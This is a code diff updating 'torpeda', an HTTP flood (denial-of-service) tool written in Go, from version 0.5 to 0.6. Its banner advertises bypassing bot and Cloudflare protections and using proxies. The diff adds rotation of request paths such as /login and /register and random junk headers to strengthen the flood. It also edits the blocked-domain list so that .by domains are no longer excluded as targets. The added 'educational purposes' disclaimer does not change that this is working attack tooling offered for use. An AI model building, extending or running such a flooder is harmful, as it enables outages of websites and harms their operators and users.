@@ -93,6 +93,9 @@ var (
 	refererURL       string
 	customCookie     string
 	customUserAgent  string
+	multipathValue   string
+    paths            = []string{""}
+    currentPathIndex = 0 
 
 	connectionFlow   = uint32(15663105)
 	statusMutex      sync.Mutex
@@ -100,7 +103,7 @@ var (
 	customHeaders    = make(map[string]string)
 	licenseVerified  = false
 
-	blockedDomains = []string{".gov", ".by", ".ua"}
+	blockedDomains = []string{".gov", ".byf", ".ua"}
 
 	randomReferers = []string{
 		"https://www.google.com",
@@ -176,12 +179,14 @@ func isBlockedDomain(target string) bool {
 }
 
 func main() {
+	parseMultipath()
 	validMethods := []string{"GET", "POST", "HEAD", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"}
 	if len(os.Args) < 7 {
 	fmt.Print("\033[H\033[2J")
-	fmt.Println(`	[flooder - golang] torpeda v0.5 // Updated: 11.11.2024 // Made with love :D
+	fmt.Println(`	[flooder - golang] torpeda v0.6 // Updated: 13.11.2024 // Made with love :D
 	Developers to method: mitigations aka @rapidreset
-	Annoucement: @torpeda && github.com/pxttrn
+	WARNING: The method was done for educational purposes, all responsibility is on you!
+	Annoucement: torpeda channel (in bio) / @rapidreset
 	Features: bypass BFM, many options, support %RAND% in target, support rate like 4.7, support http/socks proxy
 	How to use & example:
 
@@ -200,6 +205,7 @@ func main() {
 	--ua "<string>" - For custom useragent ex: "curl/4.0"
 	--cf - For sites who has protection based on check cf_clearence cookies
 	--http1 - For sites who have only http/1.1 
+	--multipath "/login@/register@" - max 5 paths like "/page1@/page2@/page3@/page4@/page5"
 	 `)
 	return
 }
@@ -298,20 +304,6 @@ func main() {
 	time.Sleep(time.Duration(duration) * time.Second)
 }
 
-func parseCustomHeaders(headers string) {
-	headerPairs := strings.Split(headers, "#")
-	for _, pair := range headerPairs {
-		parts := strings.SplitN(pair, ":", 2)
-		if len(parts) == 2 {
-			key := strings.TrimSpace(parts[0])
-			value := strings.TrimSpace(parts[1])
-			if key != "" && value != "" {
-				customHeaders[key] = value
-			}
-		}
-	}
-}
-
 func detectProxyType(proxy string) string {
 	if strings.HasPrefix(proxy, "socks5://") {
 		return "socks5"
@@ -328,6 +320,36 @@ func detectProxyType(proxy string) string {
 	}
 
 	return "http"
+}
+
+func parseMultipath() {
+    for i := 0; i < len(os.Args); i++ {
+        if os.Args[i] == "--multipath" && i+1 < len(os.Args) {
+            multipathValue = os.Args[i+1]
+            paths = strings.Split(multipathValue, "@")
+            break
+        }
+    }
+}
+
+func getNextPath() string {
+    currentPath := paths[currentPathIndex]
+    currentPathIndex = (currentPathIndex + 1) % len(paths)
+    return currentPath
+}
+
+func parseCustomHeaders(headers string) {
+	headerPairs := strings.Split(headers, "#")
+	for _, pair := range headerPairs {
+		parts := strings.SplitN(pair, ":", 2)
+		if len(parts) == 2 {
+			key := strings.TrimSpace(parts[0])
+			value := strings.TrimSpace(parts[1])
+			if key != "" && value != "" {
+				customHeaders[key] = value
+			}
+		}
+	}
 }
 
 func randstr(length int) string {
@@ -460,6 +482,11 @@ func randomHeader() http.Header {
 		rand.Seed(time.Now().UnixNano())
 		secFetchSite := ref[rand.Intn(len(ref))]
 		header.Set("Sec-Fetch-Site", secFetchSite)
+	}
+
+	if extra {
+		randomKey := "1pizdec" + randstr(5)
+		header[randomKey] = []string{randstr(6)}
 	}
 
 	if reqmethod == "POST" {
@@ -684,8 +711,10 @@ func start(proxy string) {
 			return nil
 		}
 	}
+    reqPath := getNextPath()
+    fullURL := target + reqPath
 
-    req, err := http.NewRequest(reqmethod, target, nil)
+    req, err := http.NewRequest(reqmethod, fullURL, nil)
     if err != nil {
 		updateErrorCounters(err) 
         return
@@ -723,6 +752,9 @@ func start(proxy string) {
         go func() {
             defer wg.Done()
             for range ticker.C {
+				reqPath := getNextPath()
+                req.URL.Path = reqPath
+
                 resp, err := client.Do(req)
 				if err != nil {
 					updateErrorCounters(err)
@@ -780,7 +812,7 @@ fmt.Println(`	 ⣿⣿⣷⡦⠀⠀⠀⠀⢰⣿⣿⣷⠀⠀⠀⠀⠀⠀ ⠀⠃⣠�
 ⠀⠜⢠⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣦⠄⣠⠀
 ⠠⢸⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿
 ⠀⠛⣿⣿⣿⡿⠏⠀⠀⠀⠀⠀⠀⢳⣾⣿⣿⣿⣿⣿⣿⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿`)
-        fmt.Println("> Version: v0.4")
+        fmt.Println("> Version: v0.6")
         fmt.Println("> Request Method:", reqmethod)
         fmt.Println("> Target:", target)
         fmt.Println("> Time:", duration)
